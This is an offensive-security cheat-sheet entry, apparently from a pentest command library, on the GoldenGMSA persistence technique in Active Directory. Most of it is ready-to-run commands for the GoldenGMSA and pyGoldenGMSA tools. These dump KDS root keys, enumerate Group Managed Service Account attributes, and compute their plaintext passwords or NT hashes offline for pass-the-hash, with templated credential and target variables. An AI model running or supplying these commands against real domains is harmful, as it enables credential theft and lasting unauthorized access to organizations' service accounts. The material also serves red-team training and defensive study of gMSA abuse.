---
technique: GoldenGMSA
category: persistence
targets: Group Managed Service Accounts, KDS Root Keys
protocols: LDAP
remote_capable: true
tags: persistence gmsa kds-root-key golden ldap service-account ntlm pth
---

# GoldenGMSA

Group Managed Service Accounts (gMSA) have their passwords derived from a static KDS (Key Distribution Service) root key stored in AD. Once the KDS root keys are exfiltrated (requires DA/EA or SYSTEM on a forest root DC), any gMSA password can be computed offline in perpetuity using only low-privileged LDAP queries, since the per-account data needed (SID, RootKeyGuid, Password ID) is readable by any domain user.

## Windows

GoldenGMSA (C#) handles KDS key extraction, gMSA account info enumeration, and offline password computation.

### GoldenGMSA (dump KDS keys)

#csharp #da-required #kds

Export KDS root keys from the domain with Enterprise Admin or DA privileges in the forest root.

```powershell title:"Dump KDS root keys with GoldenGMSA"
.\GoldenGMSA.exe kdsinfo
```
<!-- cheat -->

### GoldenGMSA (enumerate gMSA info)

#csharp #low-priv #recon

Enumerate gMSA accounts and extract the SID, RootKeyGuid, and Password ID needed for offline computation.

```powershell title:"Enumerate gMSA account info with GoldenGMSA"
.\GoldenGMSA.exe gmsainfo
```
<!-- cheat -->

### GoldenGMSA (compute password)

#csharp #offline #compute

Compute the plaintext gMSA password offline from a SID, KDS root key, and password ID.

```powershell title:"Compute gMSA password offline with GoldenGMSA"
.\GoldenGMSA.exe compute --sid "$gmsa_sid" --kdskey "$kds_key_b64" --pwdid "$pwd_id_b64"
```
<!-- cheat
var gmsa_sid
var kds_key_b64
var pwd_id_b64
-->

## Linux

pyGoldenGMSA implements the full pipeline in Python, including NT hash output ready for pass-the-hash.

### pyGoldenGMSA (dump KDS keys)

#python #da-required #kds

Extract KDS root keys from the domain with high-privileged credentials.

```sh title:"Dump KDS root keys with pyGoldenGMSA"
python3 main.py -u "$user@$domain" -p "$pass" -d "$domain" --dc-ip "$rhost_ip" kdsinfo
```
<!-- cheat
import domain_ip
import users
import passwords
var dc_ip
-->

### pyGoldenGMSA (enumerate gMSA info)

#python #low-priv #recon

Enumerate gMSA accounts and retrieve the attributes needed for password computation with low-privilege credentials.

```sh title:"Enumerate gMSA account attributes with pyGoldenGMSA"
python3 main.py -u "$user@$domain" -p "$pass" -d "$domain" --dc-ip "$rhost_ip" gmsainfo
```
<!-- cheat
import domain_ip
import users
import passwords
var dc_ip
-->

### pyGoldenGMSA (compute online)

#python #compute #online

Compute the gMSA password online using a SID, automatically fetching the KDS key from the DC.

```sh title:"Compute gMSA password online with pyGoldenGMSA"
python3 main.py -u "$user@$domain" -p "$pass" -d "$domain" --dc-ip "$rhost_ip" compute --sid "$gmsa_sid"
```
<!-- cheat
import domain_ip
import users
import passwords
var dc_ip
var gmsa_sid
-->

### pyGoldenGMSA (compute offline)

#python #compute #offline

Compute the gMSA password offline from previously exfiltrated KDS root key and password ID, outputting the NT hash directly.

```sh title:"Compute gMSA password offline with pyGoldenGMSA"
python3 main.py compute --sid "$gmsa_sid" --kdskey "$kds_key_b64" --pwdid "$pwd_id_b64"
```
<!-- cheat
var gmsa_sid
var kds_key_b64
var pwd_id_b64
-->
